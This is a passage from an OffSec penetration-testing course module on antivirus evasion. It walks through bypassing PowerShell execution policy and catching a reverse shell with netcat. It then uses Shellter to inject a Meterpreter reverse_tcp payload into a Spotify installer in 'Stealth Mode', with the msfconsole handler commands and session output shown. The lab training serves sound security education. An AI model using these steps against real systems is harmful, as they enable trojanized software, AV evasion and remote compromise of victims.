### Evading Antivirus Detection with PowerShell and Shellter

#### Figure 200: Avira Scan on Our Malicious PowerShell Script
Since the `msfvenom` payload is designed for x86, we will launch the x86 version of PowerShell, named "Windows PowerShell (x86)", as shown in the image below.

#### Figure 201: Launching the x86 PowerShell Version
Let's run `bypass.ps1` and analyze the output.

```powershell
PS C:\Users\offsec\Desktop> .\bypass.ps1
.\bypass.ps1 : File C:\Users\offsec\Desktop\bypass.ps1 cannot be loaded because running scripts is disabled on this system. For more information, see about_Execution_Policies at
https://go.microsoft.com/fwlink/?LinkID=135170.
At line:1 char:1
+ .\bypass.ps1
+ ~~~~~~~~~~~~
+ CategoryInfo          : SecurityError: (:) [], PSSecurityException
+ FullyQualifiedErrorId : UnauthorizedAccess
```

**Listing 245 - Attempting to Run the Script and Encountering the Execution Policies Error**

When we attempt to run our malicious script, we encounter an error related to the execution policies, which prevent the script from running. A review of the Microsoft documentation on PowerShell execution policies (linked in the error message) indicates that these policies are set on a per-user basis rather than a per-system basis.

Keep in mind that, similar to other Windows settings, the PowerShell execution policy can be dictated by one or more Active Directory Group Policy Objects (GPOs). In such cases, it may be necessary to search for additional bypass vectors.

Let's attempt to view and change the policy for our current user. Note that in this instance, we have chosen to change the policy globally rather than on a per-script basis, which can be achieved by using the `-ExecutionPolicy Bypass` flag for each script when it is run.

First, we will retrieve the current execution policy using the `Get-ExecutionPolicy -Scope CurrentUser` command and then set it to `Unrestricted` using the `Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser` command.

```powershell
PS C:\Users\offsec\Desktop> Get-ExecutionPolicy -Scope CurrentUser
Undefined
PS C:\Users\offsec\Desktop> Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
Execution Policy Change
The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose
you to the security risks described in the about_Execution_Policies help Module at
https://go.microsoft.com/fwlink/?LinkID=135170. Do you want to change the execution policy?
[Y] Yes [A] Yes to All [N] No [L] No to All [S] Suspend [?] Help (default is "N"): A
PS C:\Users\offsec\Desktop> Get-ExecutionPolicy -Scope CurrentUser
Unrestricted
```

**Listing 246 - Changing the ExecutionPolicy for Our Current User**

The above listing shows that we have successfully changed the policy for our current user to `Unrestricted`.

Before executing our script, we will start a Netcat listener on our Kali attacker machine to interact with our shell.

```bash
kali@kali:~$ nc -lvnp 443
listening on [any] 443 ...
```

**Listing 247 - Setting Up a Netcat Listener to Interact with Our Reverse Shell**

Now we will try to launch the PowerShell script:

```powershell
PS C:\Users\offsec\Desktop> .\bypass.ps1
IsPublic IsSerial Name BaseType
-------- -------- ---- --------
True True Byte[] System.Array
124059648
124059649
...
```

**Listing 248 - Running the PowerShell Script**

The script executes without any problems, and we receive a reverse shell on our attack machine.

```bash
kali@kali:~$ nc -lvnp 443
listening on [any] 443 ...
connect to [192.168.50.1] from (UNKNOWN) [192.168.50.62] 64613
Microsoft Windows [Version 10.0.22000.675]
(c) Microsoft Corporation. All rights reserved.
C:\Users\offsec>whoami
client01\offsec
C:\Users\offsec>hostname
client01
```

**Listing 249 - Receiving a Reverse Shell on Our Attacking Machine**

This means we have effectively evaded Avira detection on our target. In mature organizations, various machine learning software can be implemented to analyze the contents of the scripts run on the system. Depending on the configuration of these systems and what they consider harmful, scripts like the one above may need to be altered or adapted for the target environment.

Additionally, when implemented correctly with a skilled operations center, Endpoint Detection and Response (EDR) systems could silently alert the SOC team, rendering our attack useless in a matter of minutes.

### Automating the Process with Shellter

Now that we have learned how to manually evade an antivirus (AV) via PowerShell, let’s explore how to automate AV evasion payloads.

**Shellter** is a dynamic shellcode injection tool and one of the most popular free tools capable of bypassing antivirus software. It uses a number of novel and advanced techniques to backdoor a valid and non-malicious executable file with a malicious shellcode payload.

While the details of the techniques Shellter uses are beyond the scope of this module, it essentially performs a thorough analysis of the target PE file and the execution paths. It then determines where it can inject our shellcode without relying on traditional injection techniques that are easily caught by AV engines. These include changing PE file section permissions and creating new sections.

Finally, Shellter attempts to use the existing PE Import Address Table (IAT) entries to locate functions that will be used for the memory allocation, transfer, and execution of our payload.

A paid version, **Shellter Pro**, supports both 32 and 64-bit binaries and includes stealthier anti-AV features.

With a little bit of theory behind us, let’s attempt to bypass our current Avira antivirus software using Shellter. We can install Shellter in Kali using the `apt` command.

```bash
kali@kali:~$ apt-cache search shellter
shellter - Dynamic shellcode injection tool and dynamic PE infector
kali@kali:~$ sudo apt install shellter
...
```

**Listing 250 - Installing Shellter in Kali Linux**

Since Shellter is designed to be run on Windows operating systems, we will also install `wine`, a compatibility layer capable of running win32 applications on several POSIX-compliant operating systems.

```bash
kali@kali:~$ sudo apt install wine
...
root@kali:~# dpkg --add-architecture i386 && apt-get update && apt-get install wine32
```

**Listing 251 - Installing Wine in Kali Linux**

Once everything is installed, running the `shellter` command in the local Kali terminal will provide us with a new console running under `wine`.

**Figure 202: Initial Shellter Console**

Shellter can run in either Auto or Manual mode. In Manual mode, the tool will launch the PE we want to use for injection and allow us to manipulate it on a more granular level. We can use this mode to highly customize the injection process in case the automatically selected options fail.

For the purposes of this example, we will run Shellter in Auto mode by selecting `A` at the prompt.

Next, we must select a target PE. Shellter will analyze and alter the execution flow to inject and execute our payload. For this example, we will use the Windows 32-bit trial executable installer for the popular music player Spotify as our target PE. At the time of writing, Spotify offers only the 32-bit Windows version of the installer.

For real engagements, it is best practice to pick a new, less scrutinized application as Shellter’s author explains.

To start, we’ll need to tell Shellter the Spotify installer location on our local Kali machine. In this case, it is `/home/kali/desktop/spotifysetup.exe`. Before analyzing and altering the original PE in any way, Shellter will first create a backup of the file.

**Figure 203: Selecting a Target PE in Shellter and Performing a Backup**

As soon as Shellter finds a suitable place to inject our payload, it will ask us if we want to enable Stealth Mode, which will attempt to restore the execution flow of the PE after our payload has been executed. Let’s enable Stealth Mode as we would like the Spotify installer to behave normally to avoid any suspicion.

At this point, we are presented with the list of available payloads. These include popular selections such as Meterpreter, but Shellter also supports custom payloads.

**Figure 204: List of Payloads Available in Shellter**

Note that in order to restore the execution flow through the Stealth Mode option, custom payloads need to terminate by exiting the current thread.

After some testing, it seems that any non-Meterpreter payload fails to be executed correctly under Windows 11, so we’ll need to resort to Meterpreter-based payloads.

In order to test Shellter’s bypass capabilities, we will use the Meterpreter version of the reverse shell payload that Avira detected at the beginning of this module. After submitting `L` for listed payloads, we’ll select the first payload. We are then presented with the default options from Metasploit, such as the reverse shell host (LHOST) and port (LPORT), which we should fill with our local Kali’s IP address and listening port.

**Figure 205: Payload Options in Shellter**

With all of the parameters set, Shellter will inject the payload into the Spotify installer and attempt to reach the first instruction of the payload.

**Figure 206: Shellter Verifying the Injection**

Now that the test has succeeded, before transferring over the malicious PE file to our Windows client, we will configure a listener on our Kali machine to interact with the Meterpreter payload. We can accomplish this with the following one-liner, remembering to replace the IP address with the one on our Kali box.

```bash
kali@kali:~$ msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.50.1;set LPORT 443;run;"
...
[*] Using configured payload generic/shell_reverse_tcp
payload => windows/meterpreter/reverse_tcp
LHOST => 192.168.50.1
LPORT => 443
[*] Started reverse TCP handler on 192.168.50.1:443
```

**Listing 252 - Setting Up a Handler for the Meterpreter Payload**

Next, we will transfer the backdoored Spotify installer over to the target Windows 11 client and launch an Avira Quick Scan as we did previously.

**Figure 207: Running a Quick Scan Using Avira**

Avira’s Quick Scan performs a check inside every user’s common folder, including the Desktop folder. Since Shellter obfuscates both the payload and the payload decoder before injecting them into the PE, Avira’s signature-based scan runs cleanly and does not consider the binary malicious.

Once we execute the file, we are presented with the default Spotify installation window, which under normal circumstances will download the Spotify package over the internet. Because our VM has no internet connection, the Spotify installer will hang indefinitely.

**Figure 208: Launching the Backdoored Spotify Installer**

Reviewing our multi/handler window, it shows that we successfully received a Meterpreter shell.

```bash
...
[*] Using configured payload generic/shell_reverse_tcp
payload => windows/meterpreter/reverse_tcp
LHOST => 192.168.50.1
LPORT => 443
[*] Started reverse TCP handler on 192.168.50.1:443
[*] Sending stage (175174 bytes) to 192.168.50.62
[*] Meterpreter session 1 opened (192.168.50.1:443 -> 192.168.50.62:52273)...
meterpreter > shell
Process 6832 created.
Channel 1 created.
Microsoft Windows [Version 10.0.22000.739]
(c) Microsoft Corporation. All rights reserved.
C:\Users\offsec\Desktop>whoami
whoami
client01\offsec
```

**Listing 253 - Receiving the Meterpreter Session**

We have launched an interactive Windows shell session and verified that we landed on the target machine as the `offsec` user.

Awesome! We managed to evade antivirus detections by injecting a malicious payload into an otherwise legitimate program. This foundational example can be further expanded and tailored on a case-by-case basis during real phishing engagements.

---

**PWK - Copyright © 2023 OffSec Services Limited. All rights reserved.**
**Made in Morocco**
**Penetration Testing with Kali Linux**